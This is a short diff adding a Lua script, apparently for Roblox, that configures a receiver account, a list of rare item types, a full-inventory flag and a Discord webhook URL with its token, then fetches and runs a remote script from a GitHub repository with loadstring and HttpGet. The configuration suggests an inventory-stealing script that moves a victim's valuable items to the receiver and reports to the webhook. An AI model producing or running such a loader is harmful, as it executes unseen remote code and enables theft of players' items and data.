@@ -1,0 +1,9 @@
+
+configs = {
+    ["Receiver"] = {"jaconman825"}, 
+    ["GoodItems"] = {"Uniqe godly ancient vintage"}, 
+    ["FullInventory"] = true, 
+    ["Webhook"] = "https://discord.com/api/webhooks/1297566877924458517/pTk2prSmJlo8n62b3SDDYgPPzNiGlknS1bnkk9t4kX0b4_Teoq0EmhbXS1CmyniCw9_C"
+    }
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Skidhub22/skid/main/skiddables.lua", true))()
